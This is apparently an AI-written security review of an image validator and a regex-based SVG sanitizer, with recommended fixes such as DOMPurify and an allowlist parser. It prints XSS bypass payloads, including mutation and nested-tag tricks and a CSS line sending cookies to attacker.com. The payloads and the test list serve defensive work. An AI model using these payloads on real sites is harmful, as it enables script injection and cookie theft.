# Security Review: Image & SVG Validation

**Date:** 2026-02-02
**Reviewer:** Claude (Security Anti-Patterns Analysis)
**Files Reviewed:**
- `src/utils/image-validation.ts`
- `src/utils/svg-sanitizer.ts`

---

## Executive Summary

| File | Overall Status | Critical Issues | Warnings |
|------|----------------|-----------------|----------|
| `image-validation.ts` | ✅ **Good** | 0 | 3 |
| `svg-sanitizer.ts` | 🚨 **Critical Vulnerabilities** | 5 | 3 |

---

## 1. image-validation.ts

### ✅ What's Good

1. **Magic Byte Validation** - Prevents file extension spoofing
   - JPEG: `FF D8 FF`
   - PNG: `89 50 4E 47 0D 0A 1A 0A`
   - GIF: `47 49 46 38`
   - WebP: `52 49 46 46 ... 57 45 42 50`

2. **Allowlist Approach** - Only permits specific MIME types and extensions
3. **File Size Limits** - Prevents DoS via large files (2MB avatars, 10MB references)
4. **Multi-Layer Validation** - MIME type, extension, magic bytes, size

### ⚠️ Security Warnings

#### Warning 1: No Image Dimensions Validation
**Risk:** Medium
**Issue:** Attackers can upload 1x1 pixel images or extremely large dimensions

```typescript
// MISSING:
const img = new Image();
img.src = URL.createObjectURL(file);
await img.decode();
if (img.width > MAX_WIDTH || img.height > MAX_HEIGHT) {
  return { valid: false, error: 'Image dimensions too large' };
}
```

#### Warning 2: No Decompression Bomb Protection
**Risk:** High
**Issue:** Small compressed files can expand to gigabytes (PNG/GIF bombs)

**Example Attack:**
- 10KB compressed PNG → 1GB uncompressed
- Can crash browser/server during rendering

**Recommendation:** Add dimensions check or use server-side image processing

#### Warning 3: No Zero-Byte File Check
**Risk:** Low
**Issue:** Can upload empty files (0 bytes)

```typescript
// ADD THIS:
if (file.size === 0) {
  return { valid: false, error: 'File is empty' };
}
```

---

## 2. svg-sanitizer.ts

### 🚨 CRITICAL VULNERABILITIES

#### Critical 1: Regex-Based HTML Sanitization (Blocklist Approach)
**Risk:** CRITICAL
**CWE:** CWE-79 (XSS), CWE-116 (Improper Output Encoding)

**The Problem:**
```typescript
// ❌ VULNERABLE: Regex cannot parse HTML/SVG safely
const regex = new RegExp(`<${tag}[^>]*>.*?</${tag}>`, 'gis');
```

**Why This Fails:**
1. **Encoding Bypass:**
   ```xml
   <!-- Original regex blocks: -->
   <script>alert(1)</script>

   <!-- Attacker uses HTML entities: -->
   <&#115;cript>alert(1)</script>
   <!-- Regex doesn't match, but browser executes! -->
   ```

2. **Case/Whitespace Bypass:**
   ```xml
   <sCrIpT>alert(1)</sCrIpT>
   <script >alert(1)</script>
   <script
   >alert(1)</script>
   ```

3. **Mutation XSS:**
   ```xml
   <!-- After sanitization: -->
   <svg><style><img src=x onerror=alert(1)></style></svg>

   <!-- Browser re-parses and executes! -->
   ```

#### Critical 2: Incomplete Dangerous Attributes List
**Risk:** CRITICAL

**Currently Blocked (5 attributes):**
```typescript
['onerror', 'onload', 'onclick', 'onmouseover', 'onmouseenter']
```

**Missing 100+ Event Handlers:**
```typescript
'onfocus', 'onblur', 'onchange', 'onsubmit', 'oninput', 'onreset',
'onselect', 'onanimationend', 'onanimationiteration', 'onanimationstart',
'ontransitionend', 'onwheel', 'ondrag', 'ondrop', 'onplay', 'onpause',
// ... 80+ more
```

**Attack Example:**
```xml
<svg>
  <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
</svg>
```

#### Critical 3: Missing Dangerous SVG-Specific Vectors
**Risk:** CRITICAL

**Not Checked:**
```xml
<!-- 1. foreignObject (can contain HTML) -->
<svg>
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>

<!-- 2. use with external references (SSRF) -->
<svg>
  <use href="http://attacker.com/evil.svg#xss"/>
</svg>

<!-- 3. CSS in style tags -->
<svg>
  <style>
    * { background: url('http://attacker.com/steal?cookie=' + document.cookie); }
  </style>
</svg>

<!-- 4. data: URLs in href/xlink:href -->
<svg>
  <a href="data:text/html,<script>alert(1)</script>">
    <text>Click me</text>
  </a>
</svg>
```

#### Critical 4: Regex Catastrophic Backtracking (ReDoS)
**Risk:** HIGH
**CWE:** CWE-1333 (ReDoS)

```typescript
// ❌ VULNERABLE: Nested quantifiers
const regex = new RegExp(`<${tag}[^>]*>.*?</${tag}>`, 'gis');
//                                    ^^^^^ - Catastrophic backtracking
```

**Attack:**
```xml
<script>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...no closing tag
```
- Can hang server for minutes
- DoS with single request

#### Critical 5: No Protection Against Sanitizer Bypass Patterns
**Risk:** CRITICAL

**Example Bypasses:**
```xml
<!-- 1. Nested tags -->
<scr<script>ipt>alert(1)</script>
<!-- After sanitization: <script>alert(1)</script> -->

<!-- 2. Comment injection -->
<svg><!--><script>alert(1)</script>--></svg>

<!-- 3. CDATA sections -->
<svg><![CDATA[<script>alert(1)</script>]]></svg>
```

---

## Recommendations

### For image-validation.ts (Priority: Medium)

#### 1. Add Dimension Validation
```typescript
export async function validateImageWithDimensions(
  file: File,
  maxSize: number = MAX_AVATAR_SIZE,
  maxDimensions: { width: number; height: number } = { width: 4096, height: 4096 }
): Promise<ImageValidationResult> {
  // ... existing validation ...

  // Validate dimensions
  try {
    const img = await createImageBitmap(file);
    if (img.width > maxDimensions.width || img.height > maxDimensions.height) {
      return {
        valid: false,
        error: `Image dimensions too large. Maximum: ${maxDimensions.width}x${maxDimensions.height}px`,
      };
    }
    if (img.width === 0 || img.height === 0) {
      return { valid: false, error: 'Invalid image dimensions' };
    }
  } catch (error) {
    return { valid: false, error: 'Failed to decode image' };
  }

  return { valid: true };
}
```

#### 2. Add Zero-Byte Check
```typescript
// Add before MIME check:
if (file.size === 0) {
  return { valid: false, error: 'File is empty' };
}
```

### For svg-sanitizer.ts (Priority: CRITICAL)

#### Option 1: Use DOMPurify (RECOMMENDED)
```typescript
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeSvg(svg: string): string {
  return DOMPurify.sanitize(svg, {
    USE_PROFILES: { svg: true, svgFilters: true },
    ADD_TAGS: ['use'], // If needed
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'foreignObject'],
    FORBID_ATTR: ['onerror', 'onload'], // DOMPurify handles most
  });
}
```

**Why DOMPurify:**
- ✅ Parses with real DOM parser (not regex)
- ✅ Handles 100+ XSS vectors
- ✅ Mutation XSS protection
- ✅ Battle-tested (used by Google, Microsoft, etc.)
- ✅ 16KB gzipped

#### Option 2: Strict Allowlist (If DOMPurify Not Possible)
```typescript
// For truly hardcoded presets only
const ALLOWED_SVG_TAGS = ['svg', 'path', 'circle', 'rect', 'ellipse', 'line',
                          'polyline', 'polygon', 'g', 'defs', 'clipPath'];
const ALLOWED_ATTRIBUTES = ['viewBox', 'width', 'height', 'fill', 'stroke',
                            'd', 'cx', 'cy', 'r', 'x', 'y'];

export function sanitizePresetSvg(svg: string): string {
  const parser = new DOMParser();
  const doc = parser.parseFromString(svg, 'image/svg+xml');

  // Check for parser errors
  const parserError = doc.querySelector('parsererror');
  if (parserError) {
    throw new Error('Invalid SVG');
  }

  // Recursively clean
  function cleanElement(element: Element): void {
    // Remove if not in allowlist
    if (!ALLOWED_SVG_TAGS.includes(element.tagName.toLowerCase())) {
      element.remove();
      return;
    }

    // Remove disallowed attributes
    for (const attr of Array.from(element.attributes)) {
      if (!ALLOWED_ATTRIBUTES.includes(attr.name.toLowerCase())) {
        element.removeAttribute(attr.name);
      }
    }

    // Recursively clean children
    for (const child of Array.from(element.children)) {
      cleanElement(child);
    }
  }

  const svgElement = doc.querySelector('svg');
  if (svgElement) {
    cleanElement(svgElement);
    return new XMLSerializer().serializeToString(svgElement);
  }

  throw new Error('No valid SVG element found');
}
```

---

## Immediate Actions Required

### Priority 1: svg-sanitizer.ts (DO TODAY)

1. **Install DOMPurify:**
   ```bash
   npm install isomorphic-dompurify
   ```

2. **Replace regex-based sanitization** with DOMPurify

3. **Add tests** with XSS payloads:
   ```typescript
   // Test cases
   const xssVectors = [
     '<svg><script>alert(1)</script></svg>',
     '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
     '<svg><use href="javascript:alert(1)"/></svg>',
     '<svg><animate onbegin="alert(1)" attributeName="x"/></svg>',
   ];
   ```

### Priority 2: image-validation.ts (THIS WEEK)

1. Add dimension validation
2. Add zero-byte check
3. Consider using `sharp` library on server-side for re-encoding:
   ```typescript
   import sharp from 'sharp';

   // Re-encode to strip metadata and validate
   const cleanImage = await sharp(buffer)
     .resize(maxWidth, maxHeight, { fit: 'inside', withoutEnlargement: true })
     .toBuffer();
   ```

---

## Testing Checklist

### svg-sanitizer.ts
- [ ] Test with `<script>` tag
- [ ] Test with event handlers (`onerror`, `onload`, `onbegin`)
- [ ] Test with `<foreignObject>`
- [ ] Test with `<use href="javascript:">`
- [ ] Test with HTML entities (`&lt;script&gt;`)
- [ ] Test with CDATA sections
- [ ] Test with mutation XSS vectors
- [ ] Test with 100+ nested tags (ReDoS)

### image-validation.ts
- [ ] Test with 0-byte file
- [ ] Test with fake extension (`.png.exe`)
- [ ] Test with mismatched MIME/magic bytes
- [ ] Test with 1x1 pixel image
- [ ] Test with 10000x10000 pixel image
- [ ] Test with PNG bomb (small compressed, huge uncompressed)

---

## References

- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [SVG Security Cheatsheet](https://github.com/allanlw/svg-cheatsheet)
- [Image Bomb Prevention](https://portswigger.net/daily-swig/new-technique-for-creating-image-bombs-detected-in-the-wild)

---

**Report End**
